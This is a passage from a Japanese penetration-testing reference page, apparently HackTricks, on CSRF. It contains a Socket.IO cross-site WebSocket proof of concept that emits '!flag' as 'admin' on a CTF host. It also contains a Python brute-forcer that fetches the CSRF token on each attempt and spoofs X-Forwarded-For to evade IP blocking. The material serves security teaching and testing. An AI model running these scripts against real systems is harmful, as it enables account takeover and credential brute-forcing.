CSRF攻撃は、攻撃者が被害者の代わりに意図しないリクエストを送信することで、被害者のアカウントやデータを乗っ取る攻撃手法です。Socket.IOを使用する場合、CSRF攻撃は以下のように実行される可能性があります。

1. 攻撃者は、Socket.IOを介してリアルタイムな通信を行うWebアプリケーションにアクセスします。
2. 攻撃者は、被害者になりすましてSocket.IOのセッションを確立します。
3. 攻撃者は、Socket.IOを介して意図しないリクエストを送信し、被害者のアカウントやデータを操作します。

このようなCSRF攻撃を防ぐためには、以下の対策を実施することが重要です。

1. セッションIDを使用してSocket.IOのセッションを認証する。
2. クロスサイトリクエストフォージェリトークン（CSRFトークン）を使用して、リクエストの正当性を検証する。

セッションIDを使用してSocket.IOのセッションを認証することで、攻撃者がセッションを乗っ取ることを防ぐことができます。また、CSRFトークンを使用することで、リクエストの送信元が信頼できるものであるかを検証することができます。

以上の対策を実施することで、Socket.IOを使用したWebアプリケーションのセキュリティを向上させることができます。
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFログインブルートフォース

このコードは、CSRFトークンを使用してログインフォームをブルートフォース攻撃するために使用できます（また、可能なIPブラックリスト回避のためにX-Forwarded-Forヘッダーも使用しています）。
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ツール <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## 参考文献

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **ウェブ3のバグについてもっと学ぶために**

🐞 ウェブ3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するためにPRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **を利用してください。**

</details>
